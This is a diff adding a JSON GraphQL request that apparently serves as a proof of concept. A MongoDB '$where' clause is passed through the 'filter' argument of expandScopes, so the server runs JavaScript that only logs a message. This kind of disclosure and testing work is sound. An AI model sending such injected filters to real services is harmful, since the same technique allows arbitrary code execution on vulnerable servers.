@@ -1,0 +1,10 @@
+{
+  "operationName": "Verify",
+  "query": "query Verify($scopes: [String]!, $filter: JSON) { expandScopes(scopes: $scopes, filter: $filter) }",
+  "variables": {
+    "scopes": ["assume:anonymous"],
+    "filter": {
+      "$where": "(console.log(\"POC: $where ran inside the server for \" + String(this)), true)"
+    }
+  }
+}
